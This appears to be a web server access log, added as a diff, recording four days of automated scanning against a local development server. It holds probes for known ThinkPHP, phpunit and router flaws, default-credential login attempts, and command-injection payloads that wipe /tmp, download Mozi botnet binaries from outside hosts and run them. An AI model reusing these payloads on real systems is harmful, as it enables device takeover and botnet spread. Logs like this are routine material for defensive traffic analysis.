+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /app/common.js?version=2.4.43&build=1563436823 HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /js/room.js HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /case/ HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /static/js/winScale.js HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /Public/Wchat/js/cvphp.js HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /Public/Manage/js/cvphp.js HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /statics/js/hui.js HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /Pay/index.php HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /static/admin/js/cvphp.js HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /index/index/ajaxreg.shtml HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /trade/quote/list HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /wx/ZFpass.asp HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /jsonpublic/selectAddtion.asp HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /js/sms.js HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /pczs/js/trendChart.js HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /gai/ucms/login.php HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /api/v1/member/home HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /static/index/js/lk/order.js HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /User/Reg/ HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:26] "GET /static/new/js/shangchuan.js HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:26] "GET /11.txt HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:26] "GET /mindex/statics/js/qiandao.js HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:26] "GET /Public/Home/statics/web/js/style.js HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:26] "GET /static/js/base.js HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:26] "GET /source/pack/upload/install/ios.php HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:26] "GET /resources/main/common.js HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:26] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [12/Nov/2020 12:29:26] "GET /Public/mobile/js/config.js HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:26] "GET /static/home/static/js/iindex.js HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:30:17] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 12:47:35] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 13:30:45] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 13:40:45] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 13:58:52] "GET /currentsetting.htm HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 14:12:51] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 14:57:25] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 15:58:15] "HEAD /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 15:58:28] "GET /.env HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 15:58:29] "POST / HTTP/1.1" 405 -
+127.0.0.1 - - [12/Nov/2020 15:59:26] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 16:53:42] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 18:53:30] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 19:39:21] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 19:49:56] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 19:49:56] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [12/Nov/2020 20:08:52] "GET /config/getuser?index=0 HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 20:44:00] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 21:08:41] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 22:40:49] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 23:34:12] "POST /api/jsonws/invoke HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 23:34:12] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 23:34:13] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 23:34:13] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 23:34:13] "GET /console/ HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 23:34:13] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 23:34:14] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 23:34:14] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 23:34:15] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 23:34:15] "GET /login?next=%2F%3Fa%3Dfetch%26content%3D%3Cphp%3Edie%28%2540md5%28HelloThinkCMF%29%29%3C%252Fphp%3E HTTP/1.1" 200 -
+127.0.0.1 - - [12/Nov/2020 23:34:15] "GET /login?next=%2F%3FXDEBUG_SESSION_START%3Dphpstorm HTTP/1.1" 200 -
+127.0.0.1 - - [12/Nov/2020 23:38:40] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 00:27:58] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 00:56:10] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 01:06:51] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 01:06:51] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 01:06:52] "GET /login HTTP/1.1" 200 -
+127.0.0.1 - - [13/Nov/2020 01:14:45] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 01:14:46] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [13/Nov/2020 02:05:17] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 02:05:17] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [13/Nov/2020 02:29:39] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 02:29:39] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 02:39:10] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 03:01:08] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 04:35:18] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 05:27:58] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 05:47:40] "GET /currentsetting.htm HTTP/1.1" 404 -
+127.0.0.1 - - [13/Nov/2020 06:06:25] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 07:01:39] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 07:33:04] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 07:49:56] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 -
+127.0.0.1 - - [13/Nov/2020 08:21:29] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 08:31:55] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 09:11:59] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 09:21:28] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 -
+127.0.0.1 - - [13/Nov/2020 09:36:09] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 09:41:08] "GET /.env HTTP/1.1" 404 -
+127.0.0.1 - - [13/Nov/2020 09:41:09] "POST / HTTP/1.1" 405 -
+127.0.0.1 - - [13/Nov/2020 09:45:21] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 10:30:45] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 11:04:41] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 11:13:54] "GET /0bef HTTP/1.1" 404 -
+127.0.0.1 - - [13/Nov/2020 13:04:28] "GET /.env HTTP/1.1" 404 -
+127.0.0.1 - - [13/Nov/2020 13:04:28] "POST / HTTP/1.1" 405 -
+127.0.0.1 - - [13/Nov/2020 14:11:04] "GET /manager/text/list HTTP/1.1" 404 -
+127.0.0.1 - - [13/Nov/2020 14:34:15] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 15:27:34] "GET /manager/html HTTP/1.1" 404 -
+127.0.0.1 - - [13/Nov/2020 15:45:35] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 15:45:35] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 15:45:35] "GET /login HTTP/1.1" 200 -
+127.0.0.1 - - [13/Nov/2020 15:49:50] "GET /console/ HTTP/1.1" 404 -
+127.0.0.1 - - [13/Nov/2020 15:49:50] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 15:49:52] "POST /api/jsonws/invoke HTTP/1.1" 404 -
+127.0.0.1 - - [13/Nov/2020 15:49:52] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - [13/Nov/2020 15:49:53] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 -
+127.0.0.1 - - [13/Nov/2020 15:49:53] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 15:49:54] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 -
+127.0.0.1 - - [13/Nov/2020 15:49:55] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - [13/Nov/2020 15:49:56] "GET /login?next=%2F%3Fa%3Dfetch%26content%3D%3Cphp%3Edie%28%2540md5%28HelloThinkCMF%29%29%3C%252Fphp%3E HTTP/1.1" 200 -
+127.0.0.1 - - [13/Nov/2020 15:49:56] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 -
+127.0.0.1 - - [13/Nov/2020 15:49:56] "GET /login?next=%2F%3FXDEBUG_SESSION_START%3Dphpstorm HTTP/1.1" 200 -
+127.0.0.1 - - [13/Nov/2020 16:11:00] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 16:11:05] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [13/Nov/2020 17:05:11] "HEAD / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 17:30:19] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.1" 404 -
+127.0.0.1 - - [13/Nov/2020 18:21:52] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 -
+127.0.0.1 - - [13/Nov/2020 18:21:52] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 -
+127.0.0.1 - - [13/Nov/2020 18:42:09] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 -
+127.0.0.1 - - [13/Nov/2020 18:42:09] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 -
+127.0.0.1 - - [13/Nov/2020 19:52:47] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 19:58:28] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 19:58:28] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [13/Nov/2020 21:46:54] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 21:46:54] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [13/Nov/2020 21:56:52] "HEAD / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 22:12:50] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 22:17:15] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 22:17:15] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [13/Nov/2020 22:31:12] "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.1" 404 -
+127.0.0.1 - - [13/Nov/2020 22:45:49] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [13/Nov/2020 22:45:50] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [13/Nov/2020 23:14:04] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 00:40:01] "GET /config/getuser?index=0 HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 01:21:22] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [14/Nov/2020 01:21:22] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [14/Nov/2020 01:21:22] "GET /login HTTP/1.1" 200 -
+127.0.0.1 - - [14/Nov/2020 05:16:22] "GET /.env HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 05:16:23] "POST / HTTP/1.1" 405 -
+127.0.0.1 - - [14/Nov/2020 05:26:59] "GET /config/getuser?index=0 HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 07:34:29] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [14/Nov/2020 08:02:32] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [14/Nov/2020 08:06:17] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [14/Nov/2020 08:06:17] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [14/Nov/2020 08:12:51] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [14/Nov/2020 08:49:59] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [14/Nov/2020 08:58:19] "POST /api/jsonws/invoke HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 08:58:19] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 08:58:20] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 08:58:20] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 08:58:21] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 302 -
+127.0.0.1 - - [14/Nov/2020 08:58:21] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 08:58:21] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 302 -
+127.0.0.1 - - [14/Nov/2020 08:58:21] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 08:58:23] "GET /console/ HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 08:58:23] "GET /login?next=%2F%3FXDEBUG_SESSION_START%3Dphpstorm HTTP/1.1" 200 -
+127.0.0.1 - - [14/Nov/2020 08:58:24] "GET /login?next=%2F%3Fa%3Dfetch%26content%3D%3Cphp%3Edie%28%2540md5%28HelloThinkCMF%29%29%3C%252Fphp%3E HTTP/1.1" 200 -
+127.0.0.1 - - [14/Nov/2020 09:03:32] "GET /config/getuser?index=0 HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 10:12:40] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 10:12:40] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 10:57:52] "GET /TP/public/index.php HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 10:57:53] "GET /TP/index.php HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 10:57:54] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 10:57:55] "GET /html/public/index.php HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 10:57:56] "GET /public/index.php HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 10:57:56] "GET /TP/html/public/index.php HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 10:57:57] "GET /elrekt.php HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 10:57:57] "GET /index.php HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 10:57:58] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [14/Nov/2020 10:57:58] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [14/Nov/2020 11:03:11] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [14/Nov/2020 11:07:18] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [14/Nov/2020 11:19:23] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 12:17:04] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [14/Nov/2020 12:29:18] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [14/Nov/2020 12:29:18] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [14/Nov/2020 13:11:45] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [14/Nov/2020 14:21:11] "GET /manager/html HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 14:21:45] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [14/Nov/2020 15:36:16] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [14/Nov/2020 16:50:41] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [14/Nov/2020 16:50:41] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [14/Nov/2020 16:54:27] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [14/Nov/2020 19:07:32] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [14/Nov/2020 19:35:19] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [14/Nov/2020 20:26:48] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [14/Nov/2020 21:14:37] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [14/Nov/2020 22:35:34] "GET /config/getuser?index=0 HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 22:36:29] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 22:36:29] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 22:36:29] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 302 -
+127.0.0.1 - - [14/Nov/2020 22:36:31] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 22:36:32] "GET /login?next=%2F%3FXDEBUG_SESSION_START%3Dphpstorm HTTP/1.1" 200 -
+127.0.0.1 - - [14/Nov/2020 22:36:33] "POST /api/jsonws/invoke HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 22:36:33] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 22:36:34] "GET /console/ HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 22:36:34] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 22:36:35] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 302 -
+127.0.0.1 - - [14/Nov/2020 22:36:36] "GET /login?next=%2F%3Fa%3Dfetch%26content%3D%3Cphp%3Edie%28%2540md5%28HelloThinkCMF%29%29%3C%252Fphp%3E HTTP/1.1" 200 -
+127.0.0.1 - - [14/Nov/2020 22:43:58] "GET /config/getuser?index=0 HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 22:52:09] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 22:52:09] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 -
+127.0.0.1 - - [14/Nov/2020 23:53:05] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [15/Nov/2020 02:17:44] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [15/Nov/2020 02:32:22] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [15/Nov/2020 03:18:37] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [15/Nov/2020 03:18:37] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [15/Nov/2020 03:46:01] "HEAD /lLRS HTTP/1.1" 404 -
+127.0.0.1 - - [15/Nov/2020 03:56:58] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.1" 404 -
+127.0.0.1 - - [15/Nov/2020 04:53:16] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [15/Nov/2020 04:53:16] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [15/Nov/2020 05:21:19] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 -
+127.0.0.1 - - [15/Nov/2020 06:10:33] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [15/Nov/2020 06:54:06] "POST /login.do HTTP/1.1" 404 -
+127.0.0.1 - - [15/Nov/2020 07:25:04] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [15/Nov/2020 07:25:04] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [15/Nov/2020 09:31:28] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.1" 404 -
+127.0.0.1 - - [15/Nov/2020 10:39:22] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [15/Nov/2020 10:39:22] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [15/Nov/2020 10:46:37] "GET /hEjE HTTP/1.1" 404 -
+127.0.0.1 - - [15/Nov/2020 10:52:48] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [15/Nov/2020 11:05:04] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [15/Nov/2020 11:10:31] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [15/Nov/2020 11:58:39] "GET /config/getuser?index=0 HTTP/1.1" 404 -
+127.0.0.1 - - [15/Nov/2020 12:25:18] "GET /.env HTTP/1.1" 404 -
+127.0.0.1 - - [15/Nov/2020 12:25:19] "POST / HTTP/1.1" 405 -
+127.0.0.1 - - [15/Nov/2020 14:27:57] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [15/Nov/2020 14:27:57] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [15/Nov/2020 15:04:10] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [15/Nov/2020 15:04:10] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [15/Nov/2020 15:17:26] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - [15/Nov/2020 15:17:26] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 -
+127.0.0.1 - - [15/Nov/2020 15:17:27] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 -
+127.0.0.1 - - [15/Nov/2020 15:17:27] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - [15/Nov/2020 15:17:28] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 302 -
+127.0.0.1 - - [15/Nov/2020 15:17:29] "GET /console/ HTTP/1.1" 404 -
+127.0.0.1 - - [15/Nov/2020 15:17:29] "POST /api/jsonws/invoke HTTP/1.1" 404 -
+127.0.0.1 - - [15/Nov/2020 15:17:29] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 -
+127.0.0.1 - - [15/Nov/2020 15:17:29] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 302 -
+127.0.0.1 - - [15/Nov/2020 15:17:30] "GET /login?next=%2F%3FXDEBUG_SESSION_START%3Dphpstorm HTTP/1.1" 200 -
+127.0.0.1 - - [15/Nov/2020 15:17:30] "GET /login?next=%2F%3Fa%3Dfetch%26content%3D%3Cphp%3Edie%28%2540md5%28HelloThinkCMF%29%29%3C%252Fphp%3E HTTP/1.1" 200 -
+127.0.0.1 - - [15/Nov/2020 15:37:48] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [15/Nov/2020 16:21:22] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://117.202.69.209:55619/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.1" 404 -
+127.0.0.1 - - [15/Nov/2020 17:18:05] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 -
+127.0.0.1 - - [15/Nov/2020 17:20:18] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [15/Nov/2020 17:20:18] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [15/Nov/2020 17:35:31] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [15/Nov/2020 18:16:58] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [15/Nov/2020 18:17:45] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [15/Nov/2020 18:17:45] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [15/Nov/2020 18:57:16] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [15/Nov/2020 19:50:40] "GET /TP/public/index.php HTTP/1.1" 404 -
+127.0.0.1 - - [15/Nov/2020 19:50:41] "GET /TP/index.php HTTP/1.1" 404 -
+127.0.0.1 - - [15/Nov/2020 19:50:41] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 -
+127.0.0.1 - - [15/Nov/2020 19:50:42] "GET /html/public/index.php HTTP/1.1" 404 -
+127.0.0.1 - - [15/Nov/2020 19:50:42] "GET /public/index.php HTTP/1.1" 404 -
+127.0.0.1 - - [15/Nov/2020 19:50:43] "GET /TP/html/public/index.php HTTP/1.1" 404 -
+127.0.0.1 - - [15/Nov/2020 19:50:43] "GET /elrekt.php HTTP/1.1" 404 -
+127.0.0.1 - - [15/Nov/2020 19:50:44] "GET /index.php HTTP/1.1" 404 -
+127.0.0.1 - - [15/Nov/2020 19:50:44] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [15/Nov/2020 19:50:45] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [15/Nov/2020 20:42:04] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [15/Nov/2020 20:57:10] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [15/Nov/2020 20:57:10] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [15/Nov/2020 22:16:29] "GET /config/getuser?index=0 HTTP/1.1" 404 -
+ * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
